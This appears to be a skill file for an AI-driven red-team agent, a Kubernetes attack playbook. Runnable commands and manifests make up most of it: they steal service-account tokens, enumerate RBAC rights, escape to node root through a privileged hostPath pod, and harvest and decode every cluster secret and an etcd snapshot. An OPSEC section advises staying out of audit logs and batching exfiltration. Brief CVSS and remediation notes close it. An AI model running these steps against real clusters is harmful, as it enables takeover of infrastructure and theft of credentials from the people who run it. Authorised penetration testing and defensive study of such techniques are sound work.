---
name: k8s-pivot
description: Kubernetes attack playbook — service-account token theft, RBAC abuse, pod escape, hostPath mount abuse, kube-api-server pivoting.
metadata:
  subdomain: cloud
  when_to_use: "kubernetes k8s pod escape cluster compromise lateral"
  mitre_attack:
    - T1552.007
    - T1610
    - T1611
    - T1613
---

# Kubernetes Pivot

## 1. Identify the cluster you're in
Inside a compromised pod:
```bash
# Service account token (default mount)
cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/sa.tok
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt > /tmp/ca.crt

# API server address
echo $KUBERNETES_SERVICE_HOST $KUBERNETES_SERVICE_PORT_HTTPS
# Or: env | grep KUBE
```

## 2. Inventory permissions
```bash
KUBECTL="kubectl --token=$(cat /tmp/sa.tok) --certificate-authority=/tmp/ca.crt \
         --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS"

# What can I do in my own namespace?
$KUBECTL auth can-i --list --namespace=$(cat .../namespace) > /tmp/can_ns.txt

# Cluster-wide?
$KUBECTL auth can-i --list > /tmp/can_cluster.txt

# Specifically check the high-value verbs
for verb in get list create delete patch update; do
  for res in secrets pods deployments daemonsets nodes clusterroles rolebindings serviceaccounts; do
    $KUBECTL auth can-i $verb $res --all-namespaces 2>/dev/null | \
      grep -q yes && echo "$verb $res YES"
  done
done > /tmp/verbs.txt
```

Decepticon ingest:
```
k8s_audit("/tmp/can_cluster.txt")
```

## 3. RBAC escalation primitives
| Verb + Resource | What it enables |
|---|---|
| `create pods` | Create a pod with mount of host root, then RCE on node |
| `get secrets` | Steal SA tokens, k8s API creds, dockercfg, TLS keys |
| `create serviceaccounts.tokens` | Mint a new SA token w/ chosen TTL |
| `update/patch clusterrolebindings` | Bind self to cluster-admin |
| `impersonate` | Act as any user / SA |
| `create pods/exec` | Exec into running pod → steal its token |
| `bind / escalate` (on Role/ClusterRole) | Grant any permission |
| `create persistentvolumes` (cluster-wide) | hostPath PV → read host fs |
| `create podsecuritypolicies` (old K8s) | Author own permissive PSP |
| `create validatingwebhookconfigurations` | Intercept apiserver requests |
| `create mutatingwebhookconfigurations` | Modify any object on admission |
| `update nodes/status` (rare) | Spoof node taints, evict pods |

## 4. Pod escape — host root via hostPath
```yaml
# escape-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  hostPID: true        # see all host PIDs
  hostNetwork: true    # bypass network policies
  containers:
  - name: shell
    image: alpine
    command: ["sh", "-c", "sleep 1d"]
    securityContext:
      privileged: true     # CAP_*, no user-namespace remap, no AppArmor
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
```

```bash
$KUBECTL create -f escape-pod.yaml
$KUBECTL exec -it escape-pod -- chroot /host /bin/bash
# Now root on the underlying node
```

## 5. Secrets harvest
```bash
# All accessible secrets across namespaces
$KUBECTL get secrets --all-namespaces -o json > /tmp/secrets.json
jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name) \(.type)"' /tmp/secrets.json

# Decode SA tokens
jq -r '.items[] | select(.type=="kubernetes.io/service-account-token") |
       "\(.metadata.namespace)/\(.metadata.name) \(.data.token | @base64d)"' \
  /tmp/secrets.json > /tmp/sa-tokens.txt

# Decode dockercfg / dockerconfigjson
jq -r '.items[] | select(.type=="kubernetes.io/dockerconfigjson") |
       .data[".dockerconfigjson"] | @base64d' /tmp/secrets.json
```

## 6. Container runtime escapes (when you have privileged pod or specific caps)
| Primitive | Technique |
|---|---|
| `/var/run/docker.sock` mounted in pod | `docker exec` on host containers → host root |
| `/run/containerd/containerd.sock` | `ctr` cmd → escape |
| `CAP_SYS_ADMIN` w/o user namespace | Mount syscall → reread cgroups → release_agent |
| `CAP_SYS_PTRACE` | Inject into host PID 1 (only if hostPID:true) |
| `CAP_DAC_READ_SEARCH` | Open arbitrary file by inode (CVE-2022-0185 era) |
| Kernel CVEs (Dirty Pipe, etc) | Standard linux escape from any container |

## 7. Pivoting from the API server
With cluster-admin token:
```bash
# List all nodes
$KUBECTL get nodes -o wide

# Each node has an internal IP — once you have host root, you have
# network reach to the underlying infra (etcd, cloud metadata, etc)

# Steal etcd snapshot via cluster-admin
$KUBECTL --raw '/api/v1/namespaces/kube-system/pods' > /tmp/all-pods.json
# Find etcd pod, exec, dump
$KUBECTL exec -n kube-system etcd-master -- \
  etcdctl snapshot save /tmp/etcd.db --cacert=/etc/kubernetes/pki/etcd/ca.crt
```

## 8. Promote
```
kg_add_node(kind="vulnerability", label="K8s RBAC: <verb> on <resource>",
            props={"severity":"<sev>","namespace":"<ns>","cluster":"<cluster>"})
kg_add_edge(src=<vuln>, dst=<crown_jewel:cluster-admin>, kind="reaches")
```

## OPSEC
- K8s **audit policy** logs every API call. If audit is set to `Metadata` or higher, every kubectl op is recorded with user SA, verb, resource, response code.
- Cloud providers (EKS/GKE/AKS) ship audit logs to CloudWatch / Stackdriver / Log Analytics — assume engagement is observed.
- Use a low-priv SA token first, escalate only when needed, and exfil secrets in one batch (don't list-secrets repeatedly).

## CVSS
- create-pod privileged anywhere: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = 9.0
- get-secrets in kube-system: 9.0
- escalate clusterrolebindings: 10.0 (instant cluster-admin)
- Default ServiceAccount auto-mounted into all pods + privileged pod creation allowed: 9.5 (engagement-ending)

## Defender remediation (high-level)
- Disable automounting of default SA tokens (`automountServiceAccountToken: false`)
- Enforce PodSecurity standards (`baseline` minimum, `restricted` ideal)
- Audit cluster-wide ClusterRoleBindings — many clusters have `system:masters` aliases to misnamed groups
- Network policies to block pod → kube-api except where required
